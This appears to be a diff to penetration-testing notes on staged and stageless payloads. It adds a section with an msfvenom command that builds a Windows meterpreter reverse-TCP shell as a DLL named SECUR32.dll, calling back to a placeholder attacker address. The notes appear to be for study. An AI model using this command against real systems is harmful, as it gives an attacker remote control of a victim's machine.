@@ -32,3 +32,14 @@ When creating a staged payload, you will need to use a metasploit handler (explo
 ## Stagedless payload
 
 A stage less payload is a standalone program that does not need anything aditional (no metasploit connection), just the netcat listener on the computer.
+
+
+## crafting a DLL file with a webshell
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IPAttacker> LPORT=<4444> -a x86 -f dll > SECUR32.dll
+# -p: for the chosen payload
+# -a: architecture in the victim machine/application
+# -f: format for the output file
+```
+
